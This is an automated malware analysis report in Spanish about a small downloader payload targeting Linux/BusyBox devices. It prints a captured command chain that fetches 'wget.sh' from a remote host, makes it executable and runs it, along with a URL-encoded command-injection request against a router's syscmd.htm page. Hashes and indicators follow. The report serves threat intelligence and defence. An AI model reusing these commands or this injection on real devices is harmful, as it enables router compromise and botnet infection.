# 🧬 Payload Analysis

`60490573a5055fa8518bfbea37b32490cfac7071042abeb742b1f88fd9e73079`

## 📌 Resumen

Texto ASCII de 496 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `busybox wget hxxp://91.92.40.XXX/wget.sh -O .s`
2. `curl -o .s hxxp://91.92.40.XXX/wget.sh`
3. `chmod 777 .s`
4. `sh .s rep.realtek`
5. `rm -f .s`
6. `wget hxxp://91.92.40.XXX/wget.sh -O .s`
7. `busybox wget` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/60490573a5055fa8518bfbea37b32490cfac7071042abeb742b1f88fd9e73079.md](../../../../../malware-like/oraculo/downloader/60490573a5055fa8518bfbea37b32490cfac7071042abeb742b1f88fd9e73079.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:51:31.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `60490573a5055fa8518bfbea37b32490cfac7071042abeb742b1f88fd9e73079`
- **SHA1:** `d24251033b136e404a63623e4d48b5530d24888a`
- **MD5:** `70d795b741d887acea248472bef15ff4`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with very long lines (306), with CRLF line terminators |
| Tamaño | 496 B |
| Entropía | 5.36 |
| Strings | 7 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with very long lines (306), with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
submit-url=%2Fsyscmd.htm&sysCmd=cd%20/tmp%3Brm%20-f%20.s%3Bwget%20http://91.92.40.XXX/wget.sh%20-O%20.s%3Bbusybox%20wget
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh%20-O%20.s%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O%20.s%3Bcurl%20-o%20.s%20http://91.92.40.XXX/wget.sh%3Bchmod%20777%20.s%3Bsh%20.s%20rep.realtek%3Brm%20-f%20.s&sysCmdType=ping&apply=Apply&msg=boa.conf | strings |
| ip | 91.92.40.XXX | static_analysis |
| ip | 190.179.169.XXX | static_analysis |
| command | submit-url=%2Fsyscmd.htm&sysCmd=cd%20/tmp%3Brm%20-f%20.s%3Bwget%20http://91.92.40.XXX/wget.sh%20-O%20.s%3Bbusybox%20wget | strings |
| hash | 60490573a5055fa8518bfbea37b32490cfac7071042abeb742b1f88fd9e73079 | static_analysis |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
